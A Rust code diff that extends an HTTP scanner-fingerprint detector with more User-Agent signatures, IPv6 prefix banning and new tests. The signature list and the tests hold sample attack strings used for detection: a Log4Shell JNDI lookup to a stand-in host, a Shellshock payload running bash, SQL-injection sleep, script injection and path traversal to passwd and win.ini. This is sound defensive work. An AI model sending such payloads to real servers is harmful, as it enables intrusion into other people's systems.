@@ -1,27 +1,53 @@
 use std::net::IpAddr;
 use std::time::Duration;
 
-use ipnet::IpNet;
 
 use crate::detector::Detector;
+use crate::detectors::netkey::{source_key, DEFAULT_IPV6_PREFIX};
 use crate::models::{Action, DetectionSignal, EventType, NormalizedEvent};
 
 /// Default scanner user-agent substrings (case-insensitive matching).
-fn default_scanner_signatures() -> Vec<String> {
-    vec![
-        "nikto".into(),
-        "sqlmap".into(),
-        "nuclei".into(),
-        "nessus".into(),
-        "openvas".into(),
-        "w3af".into(),
-        "skipfish".into(),
-        "wpscan".into(),
-        "dirbuster".into(),
-        "gobuster".into(),
-        "masscan".into(),
-        "zgrab".into(),
+///
+/// Tool names, plus exploit payloads that attackers put *into* the
+/// User-Agent header (Log4Shell `jndi:`, Shellshock `() {`, traversal to
+/// system files, time-based SQLi `sleep(`, reflected XSS `<script`) — none of
+/// them occurs in a real browser or crawler UA.
+pub fn default_scanner_signatures() -> Vec<String> {
+    [
+        "nikto",
+        "sqlmap",
+        "nuclei",
+        "nessus",
+        "openvas",
+        "w3af",
+        "skipfish",
+        "wpscan",
+        "dirbuster",
+        "gobuster",
+        "masscan",
+        "zgrab",
+        // 2026-10 production review
+        "wp2shell",
+        "cve-20",
+        "l9scan",
+        "l9explore",
+        "infrawatch",
+        "pbx-scanner",
+        "censysinspect",
+        "odin-scanner",
+        "modatscanner",
+        // payloads carried in the UA itself
+        "jndi:",
+        "/etc/passwd",
+        "win.ini",
+        "boot.ini",
+        "() {",
+        "sleep(",
+        "<script",
     ]
+    .iter()
+    .map(|s| s.to_string())
+    .collect()
 }
 
 /// HTTP scanner fingerprint detector.
@@ -30,30 +56,36 @@ fn default_scanner_signatures() -> Vec<String> {
 /// signatures using case-insensitive substring matching. A single match
 /// immediately produces a detection signal.
 pub struct ScannerFingerprintDetector {
+    /// Signatures as configured (used in the signal reason).
     scanners: Vec<String>,
+    /// Lower-cased signatures, same order as `scanners`.
+    scanners_lc: Vec<String>,
     ban_duration: Duration,
+    /// IPv6 ban prefix (default /64; 0/128 = per address).
+    ipv6_prefix: u8,
 }
 
 impl ScannerFingerprintDetector {
     pub fn new() -> Self {
-        Self {
-            scanners: default_scanner_signatures(),
-            ban_duration: Duration::from_secs(259200), // 72h
-        }
+        Self::with_config(default_scanner_signatures(), Duration::from_secs(259200)) // 72h
     }
 
     pub fn with_config(scanners: Vec<String>, ban_duration: Duration) -> Self {
+        // Empty signatures would match every UA: drop them.
+        let scanners: Vec<String> = scanners.into_iter().filter(|s| !s.trim().is_empty()).collect();
+        let scanners_lc = scanners.iter().map(|s| s.to_lowercase()).collect();
         Self {
             scanners,
+            scanners_lc,
             ban_duration,
+            ipv6_prefix: DEFAULT_IPV6_PREFIX,
         }
     }
 
-    fn ip_to_net(ip: IpAddr) -> IpNet {
-        match ip {
-            IpAddr::V4(v4) => IpNet::V4(ipnet::Ipv4Net::new(v4, 32).unwrap()),
-            IpAddr::V6(v6) => IpNet::V6(ipnet::Ipv6Net::new(v6, 128).unwrap()),
-        }
+    /// Ban IPv6 sources as this prefix (0 or 128 = per address).
+    pub fn with_ipv6_prefix(mut self, prefix: u8) -> Self {
+        self.ipv6_prefix = prefix;
+        self
     }
 
     fn compute_evidence_hash(ip: &IpAddr, ua: &str) -> [u8; 32] {
@@ -64,12 +96,10 @@ impl ScannerFingerprintDetector {
     /// Check if user_agent matches any known scanner signature (case-insensitive).
     fn matches_scanner(&self, user_agent: &str) -> Option<&str> {
         let ua_lower = user_agent.to_lowercase();
-        for sig in &self.scanners {
-            if ua_lower.contains(&sig.to_lowercase()) {
-                return Some(sig.as_str());
-            }
-        }
-        None
+        self.scanners_lc
+            .iter()
+            .position(|sig| ua_lower.contains(sig.as_str()))
+            .map(|i| self.scanners[i].as_str())
     }
 }
 
@@ -101,7 +131,7 @@ impl Detector for ScannerFingerprintDetector {
         let evidence_hash = Self::compute_evidence_hash(&ip, user_agent);
 
         Some(DetectionSignal {
-            source_ip: Self::ip_to_net(ip),
+            source_ip: source_key(ip, self.ipv6_prefix),
             severity: 200,
             confidence: 0.85,
             reason,
@@ -356,7 +386,8 @@ mod tests {
     fn default_constructor() {
         let det = ScannerFingerprintDetector::default();
         assert_eq!(det.name(), "scanner_fingerprint");
-        assert_eq!(det.scanners.len(), 12);
+        assert_eq!(det.scanners.len(), default_scanner_signatures().len());
+        assert!(det.scanners.len() >= 28);
         assert_eq!(det.ban_duration, Duration::from_secs(259200));
     }
 
@@ -379,5 +410,58 @@ mod tests {
                 scanner
             );
         }
+    }
+
+    #[test]
+    fn new_signatures_and_payloads_match_case_insensitively() {
+        let det = ScannerFingerprintDetector::new();
+        for ua in [
+            "WP2Shell/1.0",
+            "Mozilla/5.0 (CVE-2025-1234 checker)",
+            "Mozilla/5.0 (l9scan/2.0.; +https://leakix.net)",
+            "l9explore/1.2.2",
+            "InfraWatch scanner",
+            "PBX-Scanner",
+            "Mozilla/5.0 CensysInspect/1.1",
+            "odin-scanner/1.0",
+            "ModatScanner/1.0",
+            "${jndi:ldap://x.example/a}",
+            "() { :; }; /bin/bash -c id",
+            "Mozilla/5.0' AND SLEEP(5)--",
+            "<script>alert(1)</script>",
+            "../../../../etc/passwd",
+            "..\\..\\windows\\win.ini",
+            "C:/boot.ini",
+        ] {
+            let ev = make_http_event_with_ua("100.64.0.3", ua, EventType::HttpRequest);
+            assert!(det.process(&ev).is_some(), "UA {ua:?} must match");
+        }
+    }
+
+    #[test]
+    fn common_browsers_and_crawlers_do_not_match() {
+        let det = ScannerFingerprintDetector::new();
+        for ua in [
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
+            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+            "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
+            "-",
+        ] {
+            let ev = make_http_event_with_ua("100.64.0.3", ua, EventType::HttpRequest);
+            assert!(det.process(&ev).is_none(), "UA {ua:?} must not match");
+        }
+    }
+
+    #[test]
+    fn empty_signature_is_ignored_and_ipv6_uses_prefix() {
+        let det = ScannerFingerprintDetector::with_config(vec!["".into(), "  ".into()], Duration::from_secs(60));
+        let ev = make_http_event_with_ua("100.64.0.3", "anything", EventType::HttpRequest);
+        assert!(det.process(&ev).is_none());
+
+        let det = ScannerFingerprintDetector::new();
+        let ev = make_http_event_with_ua("2001:db8:9:9::1", "sqlmap/1.8", EventType::HttpRequest);
+        assert_eq!(det.process(&ev).unwrap().source_ip.to_string(), "2001:db8:9:9::/64");
     }
 }
